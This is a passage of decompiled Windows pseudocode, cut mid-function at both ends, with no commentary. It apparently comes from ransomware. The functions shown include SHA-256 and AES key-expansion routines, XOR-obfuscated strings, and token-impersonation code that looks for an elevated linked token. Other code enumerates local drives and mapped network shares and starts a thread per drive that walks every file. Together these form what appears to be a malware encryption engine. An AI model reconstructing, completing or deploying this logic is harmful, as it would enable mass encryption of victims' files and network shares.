    result = sub_4072B0((_DWORD *)a1, (int)v3);
    if ( result )
      return result;
    memset(v3, 0, 0x38u);
  }
  else
  {
    memset(&v3[v4], 0, 56 - v4);
  }
  v6 = *(__int64 *)a1 >> 29;
  v7 = 8 * *(_DWORD *)a1;
  *(_BYTE *)(a1 + 99) = v6;
  *(_BYTE *)(a1 + 96) = HIBYTE(v6);
  *(_BYTE *)(a1 + 97) = BYTE2(v6);
  *(_BYTE *)(a1 + 98) = BYTE1(v6);
  *(_BYTE *)(a1 + 100) = HIBYTE(v7);
  *(_BYTE *)(a1 + 101) = BYTE2(v7);
  *(_BYTE *)(a1 + 102) = BYTE1(v7);
  *(_BYTE *)(a1 + 103) = v7;
  result = sub_4072B0((_DWORD *)a1, (int)v3);
  if ( !result )
  {
    *a2 = *(_BYTE *)(a1 + 11);
    a2[1] = *(_BYTE *)(a1 + 10);
    a2[2] = BYTE1(*(_DWORD *)(a1 + 8));
    a2[3] = *(_BYTE *)(a1 + 8);
    a2[4] = *(_BYTE *)(a1 + 15);
    a2[5] = *(_BYTE *)(a1 + 14);
    a2[6] = BYTE1(*(_DWORD *)(a1 + 12));
    a2[7] = *(_BYTE *)(a1 + 12);
    a2[8] = *(_BYTE *)(a1 + 19);
    a2[9] = *(_BYTE *)(a1 + 18);
    a2[10] = BYTE1(*(_DWORD *)(a1 + 16));
    a2[11] = *(_BYTE *)(a1 + 16);
    a2[12] = *(_BYTE *)(a1 + 23);
    a2[13] = *(_BYTE *)(a1 + 22);
    a2[14] = BYTE1(*(_DWORD *)(a1 + 20));
    a2[15] = *(_BYTE *)(a1 + 20);
    a2[16] = *(_BYTE *)(a1 + 27);
    a2[17] = *(_BYTE *)(a1 + 26);
    a2[18] = BYTE1(*(_DWORD *)(a1 + 24));
    a2[19] = *(_BYTE *)(a1 + 24);
    a2[20] = *(_BYTE *)(a1 + 31);
    a2[21] = *(_BYTE *)(a1 + 30);
    a2[22] = BYTE1(*(_DWORD *)(a1 + 28));
    a2[23] = *(_BYTE *)(a1 + 28);
    a2[24] = *(_BYTE *)(a1 + 35);
    a2[25] = *(_BYTE *)(a1 + 34);
    a2[26] = BYTE1(*(_DWORD *)(a1 + 32));
    a2[27] = *(_BYTE *)(a1 + 32);
    if ( !*(_DWORD *)(a1 + 104) )
    {
      a2[28] = *(_BYTE *)(a1 + 39);
      a2[29] = *(_BYTE *)(a1 + 38);
      a2[30] = BYTE1(*(_DWORD *)(a1 + 36));
      a2[31] = *(_BYTE *)(a1 + 36);
    }
    return 0;
  }
  return result;
}

//----- (00407DC0) --------------------------------------------------------
void *__cdecl sub_407DC0(void *a1)
{
  void *result; // eax

  result = a1;
  if ( a1 )
    return sub_408020(a1, 0x6Cu);
  return result;
}

//----- (00407DE0) --------------------------------------------------------
void *__cdecl sub_407DE0(void *a1)
{
  return memset(a1, 0, 0x6Cu);
}

//----- (00407E00) --------------------------------------------------------
int __cdecl sub_407E00(char *Src, int a2, _BYTE *a3, int a4)
{
  int v4; // esi
  int v6[27]; // [esp+4h] [ebp-6Ch] BYREF

  memset(v6, 0, sizeof(v6));
  v4 = sub_407E70(v6, a4);
  if ( !v4 )
  {
    v4 = sub_407F40((size_t *)v6, Src, a2);
    if ( !v4 )
      v4 = sub_407C00((int)v6, a3);
  }
  sub_408020(v6, 0x6Cu);
  return v4;
}

//----- (00407E70) --------------------------------------------------------
int __cdecl sub_407E70(_DWORD *a1, int a2)
{
  int v2; // ebx
  int v3; // esi
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // edx
  int v8; // edi
  int v9; // eax
  int v11; // [esp+Ch] [ebp-Ch]
  int v12; // [esp+10h] [ebp-8h]

  *a1 = 0;
  v2 = 528734635;
  a1[1] = 0;
  v3 = 1359893119;
  v4 = -1150833019;
  if ( a2 )
    v4 = 914150663;
  v5 = -1521486534;
  v12 = v4;
  v6 = 1013904242;
  if ( a2 )
    v6 = 812702999;
  v7 = 1541459225;
  v11 = v6;
  if ( a2 )
    v2 = 1694076839;
  v8 = -1694144372;
  if ( a2 )
  {
    v8 = 1750603025;
    v3 = -4191439;
    v7 = -1090891868;
    v5 = -150054599;
  }
  v9 = 1779033703;
  if ( a2 )
    v9 = -1056596264;
  a1[2] = v9;
  a1[3] = v12;
  a1[4] = v11;
  a1[5] = v5;
  a1[6] = v3;
  a1[7] = v8;
  a1[8] = v2;
  a1[9] = v7;
  a1[26] = a2;
  return 0;
}

//----- (00407F40) --------------------------------------------------------
int __cdecl sub_407F40(size_t *a1, char *Src, int a3)
{
  size_t v3; // esi
  int v4; // edx
  size_t v5; // eax
  int result; // eax
  char *v7; // edi
  int v8; // [esp+Ch] [ebp-4h]
  int v9; // [esp+20h] [ebp+10h]

  v3 = a3;
  if ( !a3 )
    return 0;
  v4 = *a1 & 0x3F;
  v5 = a3 + *a1;
  v9 = v4;
  v8 = 64 - v4;
  *a1 = v5;
  if ( v5 < v3 )
    ++a1[1];
  if ( v4 && v3 >= 64 - v4 )
  {
    memcpy((char *)a1 + v4 + 40, Src, 64 - v4);
    result = sub_4072B0(a1, (int)(a1 + 10));
    if ( result )
      return result;
    v7 = &Src[v8];
    v3 -= v8;
    v9 = 0;
  }
  else
  {
    v7 = Src;
  }
  if ( v3 < 0x40 )
  {
LABEL_12:
    if ( v3 )
      memcpy((char *)a1 + v9 + 40, v7, v3);
    return 0;
  }
  while ( 1 )
  {
    result = sub_4072B0(a1, (int)v7);
    if ( result )
      return result;
    v3 -= 64;
    v7 += 64;
    if ( v3 < 0x40 )
      goto LABEL_12;
  }
}

//----- (00407FF0) --------------------------------------------------------
int __cdecl sub_407FF0(int a1, BYTE *pbBuffer, DWORD dwLen, _DWORD *a4)
{
  *a4 = 0;
  if ( !sub_40A5A0(pbBuffer, dwLen) )
    return -60;
  *a4 = dwLen;
  return 0;
}

//----- (00408020) --------------------------------------------------------
void *__cdecl sub_408020(void *a1, size_t Size)
{
  return memset(a1, 0, Size);
}

//----- (00408040) --------------------------------------------------------
int __cdecl sub_408040(int *a1, int *a2, int *a3, int *a4, int *a5, int a6)
{
  int v6; // esi
  int v8[3]; // [esp+8h] [ebp-Ch] BYREF

  v6 = 0;
  sub_404760(v8);
  if ( (!a4 || (v6 = sub_405790(v8, a1, 1)) == 0 && (v6 = sub_404FB0(a4, a3, v8)) == 0)
    && (!a5 || (v6 = sub_405790(v8, a2, 1)) == 0 && (v6 = sub_404FB0(a5, a3, v8)) == 0) )
  {
    if ( a6 )
      v6 = sub_404780(a6, a2, a1);
  }
  sub_404050((int)v8);
  return v6;
}
// 408040: using guessed type int var_C[3];

//----- (004080F0) --------------------------------------------------------
int __cdecl sub_4080F0(int *a1, int *a2, _DWORD *a3, int *a4, int *a5, int *a6)
{
  int v6; // esi
  int v8[3]; // [esp+Ch] [ebp-18h] BYREF
  int v9[3]; // [esp+18h] [ebp-Ch] BYREF

  v6 = 0;
  sub_404760(v9);
  sub_404760(v8);
  if ( a4 )
  {
    if ( !a1 )
      goto LABEL_24;
    v6 = sub_405790(v9, a1, 1);
    if ( v6 )
      goto LABEL_21;
    v6 = sub_4057D0(v8, a4, a3);
    if ( v6 )
      goto LABEL_21;
    v6 = sub_404FB0(v8, v8, v9);
    if ( v6 )
      goto LABEL_21;
    if ( sub_4030C0(v8, 0) )
    {
LABEL_20:
      v6 = -16896;
      goto LABEL_25;
    }
  }
  if ( !a5 )
    goto LABEL_13;
  if ( !a2 )
    goto LABEL_24;
  v6 = sub_405790(v9, a2, 1);
  if ( v6 || (v6 = sub_4057D0(v8, a5, a3)) != 0 || (v6 = sub_404FB0(v8, v8, v9)) != 0 )
  {
LABEL_21:
    if ( v6 != -16896 && v6 != -16512 )
      v6 -= 16896;
    goto LABEL_25;
  }
  if ( sub_4030C0(v8, 0) )
    goto LABEL_20;
LABEL_13:
  if ( !a6 )
    goto LABEL_25;
  if ( !a1 || !a2 )
  {
LABEL_24:
    v6 = -16512;
    goto LABEL_25;
  }
  v6 = sub_405190(v9, a6, a2);
  if ( v6 )
    goto LABEL_21;
  v6 = sub_405790(v9, v9, 1);
  if ( v6 )
    goto LABEL_21;
  v6 = sub_404FB0(v9, v9, a1);
  if ( v6 )
    goto LABEL_21;
  if ( sub_4030C0(v9, 0) )
    goto LABEL_20;
LABEL_25:
  sub_404050((int)v9);
  sub_404050((int)v8);
  return v6;
}
// 4080F0: using guessed type int var_C[3];
// 4080F0: using guessed type int var_18[3];

//----- (004082A0) --------------------------------------------------------
int __cdecl sub_4082A0(
        int *a1,
        int *a2,
        int *a3,
        int *a4,
        int *a5,
        void (__cdecl *a6)(int, unsigned int, unsigned int),
        int a7)
{
  int v7; // esi
  void (__cdecl *v8)(int, unsigned int, unsigned int); // eax
  int v9; // ecx
  int *v10; // ecx
  int *v11; // eax
  int result; // eax
  int v13[3]; // [esp+Ch] [ebp-18h] BYREF
  int v14[3]; // [esp+18h] [ebp-Ch] BYREF

  v7 = 0;
  sub_404760(v14);
  sub_404760(v13);
  v8 = a6;
  if ( a6 )
  {
    v9 = a7;
    if ( a2 )
    {
      v7 = sub_404D30((int)a2, 0x32u, a6, a7);
      if ( v7 )
      {
LABEL_37:
        v7 = -16896;
        goto LABEL_38;
      }
      v8 = a6;
      v9 = a7;
    }
    if ( a3 )
    {
      v7 = sub_404D30((int)a3, 0x32u, v8, v9);
      if ( v7 )
        goto LABEL_37;
    }
  }
  v10 = a4;
  v11 = a1;
  if ( a2 && a3 )
  {
    if ( !a1 )
      goto LABEL_21;
    v7 = sub_405190(v14, a2, a3);
    if ( v7 )
      goto LABEL_38;
    if ( sub_4030C0(a1, 1) <= 0 || sub_403100(v14, a1) )
      goto LABEL_37;
    v11 = a1;
    v10 = a4;
  }
  if ( v11
    && v10
    && a5
    && (sub_4030C0(v10, 1) <= 0 || sub_4030C0(a5, 1) <= 0 || sub_403100(a4, a1) >= 0 || sub_403100(a5, a1) >= 0) )
  {
    goto LABEL_37;
  }
LABEL_21:
  if ( a2 )
  {
    if ( a3 )
    {
      if ( a4 )
      {
        if ( a5 )
        {
          if ( sub_4030C0(a2, 1) <= 0 )
            goto LABEL_37;
          if ( sub_4030C0(a3, 1) <= 0 )
            goto LABEL_37;
          v7 = sub_405190(v14, a4, a5);
          if ( !v7 )
          {
            v7 = sub_405790(v14, v14, 1);
            if ( !v7 )
            {
              v7 = sub_405790(v13, a2, 1);
              if ( !v7 )
              {
                v7 = sub_404FB0(v14, v14, v13);
                if ( !v7 )
                {
                  if ( sub_4030C0(v14, 0) )
                    goto LABEL_37;
                  v7 = sub_405190(v14, a4, a5);
                  if ( !v7 )
                  {
                    v7 = sub_405790(v14, v14, 1);
                    if ( !v7 )
                    {
                      v7 = sub_405790(v13, a3, 1);
                      if ( !v7 )
                      {
                        v7 = sub_404FB0(v14, v14, v13);
                        if ( !v7 )
                        {
                          if ( sub_4030C0(v14, 0) )
                            goto LABEL_37;
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_38:
  sub_404050((int)v14);
  sub_404050((int)v13);
  if ( !v7 )
    return v7;
  result = v7 - 16896;
  if ( v7 == -16896 )
    return v7;
  return result;
}
// 4082A0: using guessed type int var_C[3];
// 4082A0: using guessed type int var_18[3];

//----- (00408600) --------------------------------------------------------
void __fastcall sub_408600(int _ECX, __m128i *a2)
{
  __m128i v4; // xmm2
  __m128i v5; // xmm0
  __m128i v6; // xmm1
  __m128i v9; // xmm2
  __m128i v10; // xmm0
  __m128i v11; // xmm1
  __m128i v14; // xmm2
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v19; // xmm2
  __m128i v20; // xmm0
  __m128i v21; // xmm1
  __m128i v24; // xmm2
  __m128i v25; // xmm0
  __m128i v26; // xmm1
  __m128i v29; // xmm2
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128i v34; // xmm2
  __m128i v35; // xmm0
  __m128i v36; // xmm1
  __m128i v39; // xmm2
  __m128i v40; // xmm0
  __m128i v41; // xmm1
  __m128i v44; // xmm2
  __m128i v45; // xmm0
  __m128i v46; // xmm1
  __m128i v49; // xmm2
  __m128i v50; // xmm0
  __m128i v51; // xmm1

  _XMM1 = *a2;
  __asm { aeskeygenassist xmm0, xmm1, 1 }
  v4 = _mm_shuffle_epi32(_XMM0, 255);
  v5 = _mm_xor_si128(_mm_slli_si128(*a2, 4), *a2);
  *(__m128i *)_ECX = *a2;
  v6 = _mm_xor_si128(_mm_slli_si128(v5, 4), v5);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v6, 4), v6), v4);
  __asm { aeskeygenassist xmm0, xmm3, 2 }
  v9 = _mm_shuffle_epi32(_XMM0, 255);
  v10 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 16) = _XMM3;
  v11 = _mm_xor_si128(_mm_slli_si128(v10, 4), v10);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v11, 4), v11), v9);
  __asm { aeskeygenassist xmm0, xmm3, 4 }
  v14 = _mm_shuffle_epi32(_XMM0, 255);
  v15 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 32) = _XMM3;
  v16 = _mm_xor_si128(_mm_slli_si128(v15, 4), v15);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v16, 4), v16), v14);
  __asm { aeskeygenassist xmm0, xmm3, 8 }
  v19 = _mm_shuffle_epi32(_XMM0, 255);
  v20 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 48) = _XMM3;
  v21 = _mm_xor_si128(_mm_slli_si128(v20, 4), v20);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v21, 4), v21), v19);
  __asm { aeskeygenassist xmm0, xmm3, 10h }
  v24 = _mm_shuffle_epi32(_XMM0, 255);
  v25 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 64) = _XMM3;
  v26 = _mm_xor_si128(_mm_slli_si128(v25, 4), v25);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v26, 4), v26), v24);
  __asm { aeskeygenassist xmm0, xmm3, 20h ; ' ' }
  v29 = _mm_shuffle_epi32(_XMM0, 255);
  v30 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 80) = _XMM3;
  v31 = _mm_xor_si128(_mm_slli_si128(v30, 4), v30);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v31, 4), v31), v29);
  *(__m128i *)(_ECX + 96) = _XMM3;
  __asm { aeskeygenassist xmm0, xmm3, 40h ; '@' }
  v34 = _mm_shuffle_epi32(_XMM0, 255);
  v35 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  v36 = _mm_xor_si128(_mm_slli_si128(v35, 4), v35);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v36, 4), v36), v34);
  __asm { aeskeygenassist xmm0, xmm3, 80h ; '€' }
  v39 = _mm_shuffle_epi32(_XMM0, 255);
  v40 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 112) = _XMM3;
  v41 = _mm_xor_si128(_mm_slli_si128(v40, 4), v40);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v41, 4), v41), v39);
  __asm { aeskeygenassist xmm0, xmm3, 1Bh }
  v44 = _mm_shuffle_epi32(_XMM0, 255);
  v45 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 128) = _XMM3;
  v46 = _mm_xor_si128(_mm_slli_si128(v45, 4), v45);
  _XMM3 = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v46, 4), v46), v44);
  __asm { aeskeygenassist xmm0, xmm3, 36h ; '6' }
  v49 = _mm_shuffle_epi32(_XMM0, 255);
  v50 = _mm_xor_si128(_mm_slli_si128(_XMM3, 4), _XMM3);
  *(__m128i *)(_ECX + 144) = _XMM3;
  v51 = _mm_xor_si128(_mm_slli_si128(v50, 4), v50);
  *(__m128i *)(_ECX + 160) = _mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v51, 4), v51), v49);
  __asm { aesimc  xmm0, xmmword ptr [ecx+90h] }
  *(_OWORD *)(_ECX + 176) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+80h] }
  *(_OWORD *)(_ECX + 192) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+70h] }
  *(_OWORD *)(_ECX + 208) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+60h] }
  *(_OWORD *)(_ECX + 224) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+50h] }
  *(_OWORD *)(_ECX + 240) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+40h] }
  *(_OWORD *)(_ECX + 256) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+30h] }
  *(_OWORD *)(_ECX + 272) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+20h] }
  *(_OWORD *)(_ECX + 288) = _XMM0;
  __asm { aesimc  xmm0, xmmword ptr [ecx+10h] }
  *(_OWORD *)(_ECX + 304) = _XMM0;
}

//----- (004088C0) --------------------------------------------------------
void __stdcall __noreturn sub_4088C0(PVOID Parameter)
{
  HWND ConsoleWindow; // esi
  unsigned int v2; // eax
  char var15[25]; // [esp+13h] [ebp-15h] BYREF

  while ( 1 )
  {
    Sleep(0x7530u);
    ConsoleWindow = GetConsoleWindow();
    if ( IsWindowVisible(ConsoleWindow) )
      FlashWindow(ConsoleWindow, 0);
    v2 = 0;
    strcpy(var15, "\\y08|:509/|92?.%,(98");
    do
      var15[++v2] ^= var15[0];
    while ( v2 < 0x13 );
    var15[20] = 0;
    sub_4100C0(&var15[1], *(_DWORD *)arglist);
  }
}

//----- (00408940) --------------------------------------------------------
BOOL __stdcall sub_408940(int a1, int a2)
{
  BOOL v2; // esi
  HANDLE Toolhelp32Snapshot; // ebx
  HANDLE v4; // esi
  PROCESSENTRY32W pe; // [esp+10h] [ebp-280h] BYREF
  char TokenInformation[8]; // [esp+240h] [ebp-50h] BYREF
  int v8; // [esp+248h] [ebp-48h]
  int v9; // [esp+24Ch] [ebp-44h]
  DWORD ReturnLength; // [esp+27Ch] [ebp-14h] BYREF
  BOOL v11; // [esp+280h] [ebp-10h]
  int v12; // [esp+284h] [ebp-Ch]
  void *DuplicateTokenHandle; // [esp+288h] [ebp-8h] BYREF
  void *TokenHandle; // [esp+28Ch] [ebp-4h] BYREF

  v2 = 0;
  v11 = 0;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( Toolhelp32Snapshot != (HANDLE)-1 )
  {
    pe.dwSize = 556;
    memset(&pe.cntUsage, 0, 0x228u);
    v12 = 0;
    if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
    {
      do
      {
        v4 = OpenProcess(0x1000u, 0, pe.th32ProcessID);
        if ( v4 )
        {
          if ( OpenProcessToken(v4, 0xAu, &TokenHandle) )
          {
            if ( GetTokenInformation(TokenHandle, TokenStatistics, TokenInformation, 0x38u, &ReturnLength) )
            {
              if ( v8 == a1 && v9 == a2 )
              {
                v12 = 1;
                if ( DuplicateToken(TokenHandle, SecurityImpersonation, &DuplicateTokenHandle) )
                {
                  v11 = SetThreadToken(0, DuplicateTokenHandle);
                  CloseHandle(DuplicateTokenHandle);
                }
              }
            }
            CloseHandle(TokenHandle);
          }
          CloseHandle(v4);
          if ( v12 )
            break;
        }
      }
      while ( Process32NextW(Toolhelp32Snapshot, &pe) );
      v2 = v11;
    }
    CloseHandle(Toolhelp32Snapshot);
  }
  return v2;
}
// 408940: using guessed type char TokenInformation[8];

//----- (00408A60) --------------------------------------------------------
ULONG __stdcall sub_408A60(PVOID Parameter)
{
  BOOL v1; // esi
  HANDLE TokenInformation; // [esp+4h] [ebp-44h] BYREF
  void *TokenHandle; // [esp+8h] [ebp-40h] BYREF
  DWORD ReturnLength; // [esp+Ch] [ebp-3Ch] BYREF
  char v6[8]; // [esp+10h] [ebp-38h] BYREF
  int v7; // [esp+18h] [ebp-30h]
  int v8; // [esp+1Ch] [ebp-2Ch]

  if ( OpenProcessToken((HANDLE)0xFFFFFFFF, 8u, &TokenHandle) )
  {
    if ( GetTokenInformation(TokenHandle, TokenElevationType, &TokenInformation, 4u, &ReturnLength) )
    {
      if ( TokenInformation == HANDLE_FLAG_PROTECT_FROM_CLOSE )
      {
        if ( GetTokenInformation(TokenHandle, TokenLinkedToken, &TokenInformation, 4u, &ReturnLength) )
        {
          v1 = GetTokenInformation(TokenInformation, TokenStatistics, v6, 0x38u, &ReturnLength);
          CloseHandle(TokenInformation);
          if ( v1 )
          {
            if ( sub_408940(v7, v8) )
            {
              sub_408B20();
              SetThreadToken(0, 0);
            }
          }
        }
      }
    }
    CloseHandle(TokenHandle);
  }
  sub_408B20();
  return 0;
}
// 408A60: using guessed type char var_38[8];

//----- (00408B20) --------------------------------------------------------
BOOL sub_408B20()
{
  int v0; // edi
  void *v1; // esi
  HANDLE v2; // eax
  unsigned int v3; // eax
  CHAR v5[16]; // [esp+Ch] [ebp-34h] BYREF
  __int128 v6; // [esp+1Ch] [ebp-24h]
  WCHAR RootPathName[4]; // [esp+2Ch] [ebp-14h] BYREF
  DWORD ThreadId; // [esp+34h] [ebp-Ch] BYREF
  DWORD nLength; // [esp+38h] [ebp-8h] BYREF
  DWORD LogicalDrives; // [esp+3Ch] [ebp-4h] BYREF

  v0 = 26;
  LogicalDrives = GetLogicalDrives();
  wcscpy(RootPathName, L"Z:");
  do
  {
    if ( _bittest((const signed __int32 *)&LogicalDrives, --v0) && GetDriveTypeW(RootPathName) == 4 )
    {
      nLength = 512;
      v1 = malloc(0x400u);
      if ( WNetGetConnectionW(RootPathName, (LPWSTR)v1, &nLength) )
      {
        free(v1);
      }
      else
      {
        PathRemoveBackslashW((LPWSTR)v1);
        v2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v1, 0, &ThreadId);
        *(_OWORD *)v5 = xmmword_419380;
        hObject[nCount] = v2;
        v3 = 0;
        v6 = xmmword_418F90;
        do
          v5[++v3] ^= v5[0];
        while ( v3 < 0x1E );
        HIBYTE(v6) = 0;
        sub_4100C0(&v5[1], RootPathName, v1);
        _InterlockedIncrement((volatile signed __int32 *)&nCount);
      }
    }
    --RootPathName[0];
  }
  while ( v0 );
  return sub_408C30(0);
}
// 418F90: using guessed type __int128 xmmword_418F90;
// 419380: using guessed type __int128 xmmword_419380;
// 41B950: using guessed type HANDLE hObject[1024];

//----- (00408C30) --------------------------------------------------------
BOOL __thiscall sub_408C30(struct _NETRESOURCEW *this)
{
  _DWORD *v1; // edi
  DWORD v2; // ebx
  _DWORD *v3; // esi
  void *v4; // edi
  int v5; // eax
  DWORD ThreadId; // [esp+4h] [ebp-14h] BYREF
  HANDLE hEnum; // [esp+8h] [ebp-10h] BYREF
  DWORD cCount; // [esp+Ch] [ebp-Ch] BYREF
  _DWORD *v10; // [esp+10h] [ebp-8h]
  SIZE_T dwBytes; // [esp+14h] [ebp-4h] BYREF

  dwBytes = 0x4000;
  cCount = -1;
  if ( WNetOpenEnumW(2u, 0, 0x13u, this, &hEnum) )
    return 0;
  v1 = GlobalAlloc(0x40u, dwBytes);
  v10 = v1;
  if ( !v1 )
    return 0;
  while ( 1 )
  {
    memset(v1, 0, dwBytes);
    if ( WNetEnumResourceW(hEnum, &cCount, v1, &dwBytes) )
      break;
    v2 = 0;
    if ( cCount )
    {
      v3 = v1;
      do
      {
        if ( (v3[3] & 2) != 0 )
          sub_408C30(v3);
        if ( v1[1] != 2 )
        {
          v4 = malloc(0x400u);
          v5 = lstrlenW((LPCWSTR)v10[5]);
          memcpy(v4, (const void *)v10[5], 2 * v5 + 2);
          hObject[nCount] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, v4, 0, &ThreadId);
          _InterlockedIncrement((volatile signed __int32 *)&nCount);
          v1 = v10;
        }
        ++v2;
        v3 += 8;
      }
      while ( v2 < cCount );
    }
  }
  GlobalFree(v1);
  return !WNetCloseEnum(hEnum);
}
// 41B950: using guessed type HANDLE hObject[1024];

//----- (00408D60) --------------------------------------------------------
void __stdcall __noreturn StartAddress(_WORD *Parameter)
{
  BOOL v1; // esi
  HANDLE TokenInformation; // [esp+4h] [ebp-44h] BYREF
  void *TokenHandle; // [esp+8h] [ebp-40h] BYREF
  DWORD ReturnLength; // [esp+Ch] [ebp-3Ch] BYREF
  char v5[8]; // [esp+10h] [ebp-38h] BYREF
  int v6; // [esp+18h] [ebp-30h]
  int v7; // [esp+1Ch] [ebp-2Ch]

  if ( OpenProcessToken((HANDLE)0xFFFFFFFF, 8u, &TokenHandle) )
  {
    if ( GetTokenInformation(TokenHandle, TokenElevationType, &TokenInformation, 4u, &ReturnLength) )
    {
      if ( TokenInformation == HANDLE_FLAG_PROTECT_FROM_CLOSE )
      {
        if ( GetTokenInformation(TokenHandle, TokenLinkedToken, &TokenInformation, 4u, &ReturnLength) )
        {
          v1 = GetTokenInformation(TokenInformation, TokenStatistics, v5, 0x38u, &ReturnLength);
          CloseHandle(TokenInformation);
          if ( v1 )
          {
            if ( sub_408940(v6, v7) )
              sub_4090E0(Parameter);
          }
        }
      }
    }
    CloseHandle(TokenHandle);
  }
  sub_4090E0(Parameter);
}
// 408D60: using guessed type char var_38[8];

//----- (00408EE0) --------------------------------------------------------
void sub_408EE0()
{
  char *v0; // esi
  char v1; // al
  UINT DriveTypeW; // eax
  _WORD *v3; // eax
  HANDLE v4; // eax
  unsigned int v5; // eax
  signed int i; // esi
  DWORD ThreadId; // [esp+Ch] [ebp-54h] BYREF
  wchar_t v8[6]; // [esp+10h] [ebp-50h] BYREF
  WCHAR RootPathName[4]; // [esp+1Ch] [ebp-44h] BYREF
  __int16 v10; // [esp+24h] [ebp-3Ch]
  CHAR v11[16]; // [esp+2Ah] [ebp-36h] BYREF
  int v12; // [esp+3Ah] [ebp-26h]
  int v13; // [esp+3Eh] [ebp-22h]
  __int16 v14; // [esp+42h] [ebp-1Eh]
  char v15[28]; // [esp+44h] [ebp-1Ch] BYREF

  InitializeCriticalSection(&CriticalSection);
  hObject[nCount] = CreateThread(0, 0, sub_4138A0, 0, 0, &ThreadId);
  _InterlockedIncrement((volatile signed __int32 *)&nCount);
  hObject[nCount] = CreateThread(0, 0, sub_408A60, 0, 0, &ThreadId);
  _InterlockedIncrement((volatile signed __int32 *)&nCount);
  v0 = v15;
  v1 = 65;
  strcpy(v15, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
  do
  {
    wcscpy(v8, L"%C:\\");
    wsprintfW(RootPathName, v8, v1);
    DriveTypeW = GetDriveTypeW(RootPathName);
    if ( DriveTypeW == 3 || DriveTypeW == 2 || DriveTypeW == 6 )
    {
      v3 = malloc(0xAu);
      *(_QWORD *)v3 = *(_QWORD *)RootPathName;
      v3[4] = v10;
      v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_4090E0, v3, 0, &ThreadId);
      *(_OWORD *)v11 = xmmword_419330;
      v12 = 858275450;
      hObject[nCount] = v4;
      v5 = 0;
      v13 = 2138717996;
      v14 = 9;
      do
        v11[++v5] ^= v11[0];
      while ( v5 < 0x18 );
      HIBYTE(v14) = 0;
      sub_4100C0(&v11[1], RootPathName);
      _InterlockedIncrement((volatile signed __int32 *)&nCount);
    }
    v1 = *++v0;
  }
  while ( v1 );
  Sleep(0x1388u);
  do
  {
    do
      Sleep(0x64u);
    while ( dword_41D330 );
  }
  while ( dword_41B110 );
  WaitForMultipleObjects(nCount, hObject, 1, 0xFFFFFFFF);
  for ( i = 0; i < (int)nCount; ++i )
    CloseHandle(hObject[i]);
  DeleteCriticalSection(&CriticalSection);
}
// 419330: using guessed type __int128 xmmword_419330;
// 41B110: using guessed type int dword_41B110;
// 41B950: using guessed type HANDLE hObject[1024];
// 41D330: using guessed type int dword_41D330;

//----- (004090E0) --------------------------------------------------------
void __stdcall __noreturn sub_4090E0(_WORD *Parameter)
{
  int v1; // esi
  WCHAR *v2; // eax
  int v3; // ecx
  _WORD *v4; // eax
  unsigned int v5; // ecx
  wchar_t v6[6]; // [esp+Ch] [ebp-76Ch] BYREF
  CHAR v7[16]; // [esp+19h] [ebp-75Fh] BYREF
  int v8; // [esp+29h] [ebp-74Fh]
  char v9[11]; // [esp+2Dh] [ebp-74Bh] BYREF
  union _ULARGE_INTEGER TotalNumberOfFreeBytes; // [esp+38h] [ebp-740h] BYREF
  union _ULARGE_INTEGER FreeBytesAvailableToCaller; // [esp+40h] [ebp-738h] BYREF
  CHAR v12[104]; // [esp+48h] [ebp-730h] BYREF
  CHAR pszBuf[104]; // [esp+B0h] [ebp-6C8h] BYREF
  CHAR v14[512]; // [esp+118h] [ebp-660h] BYREF
  WCHAR FileName[264]; // [esp+318h] [ebp-460h] BYREF
  char FindFileData[592]; // [esp+528h] [ebp-250h] BYREF

  _InterlockedIncrement(&dword_41B110);
  EnterCriticalSection(&CriticalSection);
  v1 = 0;
  if ( dword_41D2FC <= 0 )
  {
LABEL_4:
    wcscpy(v6, L"%s\\*");
    wsprintfW(FileName, v6, Parameter);
    if ( FindFirstFileExW(FileName, FindExInfoStandard, FindFileData, FindExSearchNameMatch, 0, 0) != (HANDLE)-1 )
    {
      v2 = (WCHAR *)malloc(0x410u);
      lpString1[dword_41D2FC] = v2;
      memset(v2, 0, 0x410u);
      v3 = 0;
